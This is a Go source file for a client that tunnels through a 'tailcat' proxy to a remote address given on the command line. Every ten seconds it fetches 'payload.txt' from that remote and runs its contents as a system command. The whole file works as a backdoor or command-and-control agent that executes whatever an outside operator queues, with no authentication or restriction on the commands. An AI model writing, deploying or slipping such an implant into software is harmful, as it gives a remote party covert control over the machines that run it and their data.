package main

import (
	"context"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/tailscale/tailcat"
)

var httpClient = &http.Client{
	Timeout: 15 * time.Second,
}

func fetchAndExecuteCommand() error {
	resp, err := httpClient.Get("http://localhost:8080/payload.txt")
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		return err
	}

	command := strings.TrimSpace(string(body))
	if command == "" {
		return nil
	}

	log.Printf("received command: %s", command)
	cmdParts := strings.Fields(command)
	if len(cmdParts) == 0 {
		return nil
	}

	cmd := exec.Command(cmdParts[0], cmdParts[1:]...)
	out, err := cmd.CombinedOutput()
	if len(out) > 0 {
		log.Printf("command output:\n%s", strings.TrimSpace(string(out)))
	}
	if err != nil {
		return err
	}
	return nil
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("usage: ./client <tailcat-address>")
	}

	ctx := context.Background()
	cl := tailcat.NewClient(tailcat.Addr(os.Args[1]))
	defer cl.Close()

	ln, err := net.Listen("tcp", "127.0.0.1:8080")
	if err != nil {
		log.Fatal(err)
	}
	defer ln.Close()

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				log.Fatal(err)
			}
			go func() {
				defer conn.Close()
				remote, err := cl.DialTCPPort(ctx, 8080)
				if err != nil {
					log.Println("dial remote:", err)
					return
				}
				tailcat.ProxyConns(conn, remote)
			}()
		}
	}()

	// Poll for queued commands every 10 seconds.
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		if err := fetchAndExecuteCommand(); err != nil {
			log.Println("command fetch/exec failed:", err)
		}
	}
}
